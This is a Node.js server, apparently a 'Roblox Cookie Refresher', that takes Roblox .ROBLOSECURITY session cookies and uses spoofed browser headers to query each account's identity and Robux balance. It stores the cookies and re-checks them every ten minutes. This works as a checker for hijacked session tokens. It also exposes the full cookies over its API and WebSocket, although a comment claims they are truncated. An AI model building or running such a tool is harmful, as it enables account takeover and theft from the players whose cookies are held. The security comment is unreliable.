
const express = require('express');
const axios = require('axios');
const cookieParser = require('cookie-parser');
const WebSocket = require('ws');
const http = require('http');

const app = express();
const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(cookieParser());
app.use(express.static('public'));

// Store active cookies and their info
const activeCookies = new Map();

// WebSocket connections for real-time updates
const clients = new Set();

wss.on('connection', (ws) => {
    clients.add(ws);
    console.log('Client connected');
    
    // Send current cookie data to new client
    ws.send(JSON.stringify({
        type: 'cookieList',
        cookies: Array.from(activeCookies.values())
    }));
    
    ws.on('close', () => {
        clients.delete(ws);
        console.log('Client disconnected');
    });
});

// Broadcast to all connected clients
function broadcast(data) {
    clients.forEach(client => {
        if (client.readyState === WebSocket.OPEN) {
            client.send(JSON.stringify(data));
        }
    });
}

// Function to get user info from Roblox cookie
async function getRobloxUserInfo(cookie) {
    try {
        // Enhanced headers to bypass some restrictions
        const headers = {
            'Cookie': `.ROBLOSECURITY=${cookie}`,
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
            'Accept': 'application/json, text/plain, */*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'Referer': 'https://www.roblox.com/',
            'Origin': 'https://www.roblox.com',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Sec-Fetch-Dest': 'empty',
            'Sec-Fetch-Mode': 'cors',
            'Sec-Fetch-Site': 'same-site',
            'Sec-CH-UA': '"Not_A Brand";v="8", "Chromium";v="120", "Google Chrome";v="120"',
            'Sec-CH-UA-Mobile': '?0',
            'Sec-CH-UA-Platform': '"Windows"'
        };

        // First, try to get authenticated user info
        const response = await axios.get('https://users.roblox.com/v1/users/authenticated', {
            headers: headers,
            timeout: 10000,
            maxRedirects: 5
        });
        
        const userId = response.data.id;
        const username = response.data.name;
        const displayName = response.data.displayName;
        
        // Get additional user details with retry logic
        let detailsResponse;
        let retries = 3;
        while (retries > 0) {
            try {
                detailsResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
                    headers: {
                        'User-Agent': headers['User-Agent'],
                        'Accept': 'application/json',
                        'Referer': 'https://www.roblox.com/',
                        'Origin': 'https://www.roblox.com'
                    },
                    timeout: 8000
                });
                break;
            } catch (e) {
                retries--;
                if (retries === 0) throw e;
                await new Promise(resolve => setTimeout(resolve, 2000));
            }
        }
        
        // Get robux amount with enhanced error handling
        let robux = 0;
        try {
            const robuxResponse = await axios.get(`https://economy.roblox.com/v1/users/${userId}/currency`, {
                headers: headers,
                timeout: 8000
            });
            robux = robuxResponse.data.robux || 0;
        } catch (e) {
            console.log('Could not fetch robux amount:', e.response?.status || e.message);
            // Try alternative endpoint
            try {
                const altResponse = await axios.get(`https://users.roblox.com/v1/users/${userId}`, {
                    headers: headers,
                    timeout: 5000
                });
                // Some user data might include robux info
                robux = altResponse.data.robux || 0;
            } catch (altError) {
                console.log('Alternative robux fetch also failed');
            }
        }
        
        return {
            userId: userId,
            username: username,
            displayName: displayName,
            description: detailsResponse.data.description || 'No description available',
            created: detailsResponse.data.created,
            robux: robux,
            isValid: true,
            lastChecked: new Date().toISOString(),
            cookie: cookie.substring(0, 20) + '...' // Only show first 20 chars for security
        };
    } catch (error) {
        console.error('Error fetching user info:', error.response?.status, error.response?.statusText, error.message);
        
        let errorMessage = 'Unknown error';
        if (error.response) {
            const status = error.response.status;
            switch (status) {
                case 401:
                    errorMessage = 'Invalid or expired cookie';
                    break;
                case 403:
                    errorMessage = 'Access forbidden - cookie may be restricted';
                    break;
                case 429:
                    errorMessage = 'Rate limited - too many requests';
                    break;
                case 500:
                    errorMessage = 'Roblox server error';
                    break;
                default:
                    errorMessage = `HTTP ${status}: ${error.response.statusText}`;
            }
        } else if (error.code === 'ECONNABORTED') {
            errorMessage = 'Request timeout';
        } else if (error.code === 'ENOTFOUND') {
            errorMessage = 'Network error';
        } else {
            errorMessage = error.message;
        }
        
        return {
            isValid: false,
            error: errorMessage,
            lastChecked: new Date().toISOString(),
            cookie: cookie.substring(0, 20) + '...'
        };
    }
}

// Function to refresh a cookie's info
async function refreshCookie(cookieId) {
    const cookieData = activeCookies.get(cookieId);
    if (!cookieData) return;
    
    const fullCookie = cookieData.fullCookie;
    const userInfo = await getRobloxUserInfo(fullCookie);
    
    const updatedData = {
        ...cookieData,
        ...userInfo,
        id: cookieId
    };
    
    activeCookies.set(cookieId, updatedData);
    
    // Broadcast update to all clients
    broadcast({
        type: 'cookieUpdate',
        cookie: updatedData
    });
    
    return updatedData;
}

// Auto-refresh all cookies every 10 minutes (increased interval to reduce rate limiting)
setInterval(async () => {
    console.log('Auto-refreshing all cookies...');
    const cookieIds = Array.from(activeCookies.keys());
    
    for (let i = 0; i < cookieIds.length; i++) {
        const cookieId = cookieIds[i];
        try {
            await refreshCookie(cookieId);
            console.log(`Refreshed cookie ${i + 1}/${cookieIds.length}`);
        } catch (error) {
            console.error(`Failed to refresh cookie ${cookieId}:`, error.message);
        }
        
        // Wait 3 seconds between requests to avoid rate limiting
        if (i < cookieIds.length - 1) {
            await new Promise(resolve => setTimeout(resolve, 3000));
        }
    }
    console.log('Auto-refresh completed');
}, 10 * 60 * 1000);

// Routes
app.get('/', (req, res) => {
    res.sendFile(__dirname + '/public/index.html');
});

app.post('/api/add-cookie', async (req, res) => {
    const { cookie } = req.body;
    
    if (!cookie) {
        return res.status(400).json({ error: 'Cookie is required' });
    }
    
    const cookieId = Date.now().toString();
    const userInfo = await getRobloxUserInfo(cookie);
    
    const cookieData = {
        id: cookieId,
        fullCookie: cookie,
        ...userInfo
    };
    
    activeCookies.set(cookieId, cookieData);
    
    // Broadcast new cookie to all clients
    broadcast({
        type: 'cookieAdded',
        cookie: cookieData
    });
    
    res.json({ success: true, data: cookieData });
});

app.post('/api/refresh-cookie/:id', async (req, res) => {
    const cookieId = req.params.id;
    const updatedData = await refreshCookie(cookieId);
    
    if (updatedData) {
        res.json({ success: true, data: updatedData });
    } else {
        res.status(404).json({ error: 'Cookie not found' });
    }
});

app.delete('/api/remove-cookie/:id', (req, res) => {
    const cookieId = req.params.id;
    
    if (activeCookies.has(cookieId)) {
        activeCookies.delete(cookieId);
        
        // Broadcast removal to all clients
        broadcast({
            type: 'cookieRemoved',
            cookieId: cookieId
        });
        
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Cookie not found' });
    }
});

app.get('/api/cookies', (req, res) => {
    res.json(Array.from(activeCookies.values()));
});

const PORT = process.env.PORT || 5000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Roblox Cookie Refresher running on port ${PORT}`);
});
